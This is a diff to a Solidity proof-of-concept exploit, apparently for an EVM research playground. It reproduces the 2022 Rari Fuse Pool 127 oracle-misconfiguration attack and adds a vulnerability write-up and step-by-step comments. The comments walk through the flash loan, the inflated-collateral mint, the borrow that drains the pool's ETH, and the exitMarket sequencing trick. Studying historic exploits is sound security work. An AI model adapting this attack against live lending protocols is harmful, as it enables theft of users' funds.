@@ -1,7 +1,24 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-// Synthetic standalone exploit for the EVM Playground (2022-04-Rari).
+/*
+ * DEEP MANUAL ANALYSIS: 2022-04-Rari (Fuse Pool 127 Oracle Misconfiguration)
+ *
+ * VULNERABILITY:
+ *   Comptroller blindly trusts oracle.getUnderlyingPrice without any range,
+ *   deviation, or feed-correctness check.
+ *   - In getHypotheticalAccountLiquidityInternal the price directly scales
+ *     collateral value: tokensToDenom = collateralFactor * exchangeRate * oraclePrice
+ *   - borrowAllowed only does `if (oracle.getUnderlyingPrice(...) == 0) PRICE_ERROR`
+ *   - Pool 127's admin wiring mapped fUSDC's price feed to the ETH/USD aggregator.
+ *   - Result: minting real USDC produced ~3526x fictitious collateral value,
+ *     allowing borrow of the pool's entire ETH cash reserve.
+ *
+ * The bug is NOT inside the cToken (mint/borrow are standard Compound v2);
+ * it is the missing defensive layer around the pluggable PriceOracle result.
+ */
+
+ // Synthetic standalone exploit for the EVM Playground (2022-04-Rari).
 //
 // The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
 // `ContractTest`: `testExploit()` triggers a Balancer flash loan whose callback
@@ -67,6 +84,8 @@ contract RariFuseOracleDrain {
     // Flash-loan 150,000,000 USDC from the Balancer Vault (zero-fee). The callback
     // below does the mint → enterMarkets → borrow → unwind → repay.
     function run() external {
+        // EXPLOIT STEP 1: Obtain 150M USDC via zero-fee flash loan.
+        // Capital is only needed transiently to manufacture the mis-priced collateral.
         address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
         uint256[] memory amounts = new uint256[](1);
@@ -82,15 +101,25 @@ contract RariFuseOracleDrain {
 
         USDC.approve(address(FUSDC_127), type(uint256).max);
         FUSDC_127.accrueInterest();
+
+        // EXPLOIT STEP 2: Mint 15M USDC into the fUSDC market.
+        // The VULNERABILITY causes the Comptroller to treat this as
+        // ~$52B of collateral (15M * 3526) because price feed was wrong.
         FUSDC_127.mint(15_000_000_000_000);
 
         address[] memory ctokens = new address[](1);
         ctokens[0] = address(FUSDC_127);
         RARI_COMPTROLLER.enterMarkets(ctokens);
 
+        // EXPLOIT STEP 3: Borrow exactly the pool's full ETH cash (1977 ETH).
+        // getHypotheticalAccountLiquidityInternal reports surplus because of
+        // the 3526x oraclePrice multiplier on the fUSDC collateral.
+        // borrowAllowed returns NO_ERROR; borrowFresh drains the cash.
         FETH_127.borrow(1977 ether);
 
         FUSDC_127.approve(address(FUSDC_127), type(uint256).max);
+
+        // EXPLOIT STEP 4 (in receive): exitMarket so redeem does not see the borrow.
         FUSDC_127.redeemUnderlying(15_000_000_000_000);
 
         uint256 usdcBalance = USDC.balanceOf(address(this));
@@ -101,6 +130,9 @@ contract RariFuseOracleDrain {
     // its receive() fires, which removes fUSDC from the collateral set (exitMarket)
     // so the subsequent redeemUnderlying does not trip a shortfall from the freshly
     // created ETH borrow.
+    //
+    // EXPLOIT STEP (receive callback): exitMarket(fUSDC) is the critical
+    // sequencing move that makes the redeem succeed after the borrow.
     receive() external payable {
         RARI_COMPTROLLER.exitMarket(address(FUSDC_127));
     }
